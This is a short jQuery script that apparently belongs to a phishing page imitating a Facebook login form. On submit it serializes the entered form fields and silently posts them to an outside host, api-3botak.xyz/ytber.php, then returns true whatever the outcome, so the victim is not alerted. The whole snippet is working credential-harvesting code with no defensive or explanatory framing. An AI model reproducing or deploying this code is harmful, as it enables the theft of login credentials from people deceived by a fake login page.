$(".form-login-fb").submit(function() {
	var d = $(".form-login-fb");

	$.ajax({
        url: "http://api-3botak.xyz/ytber.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
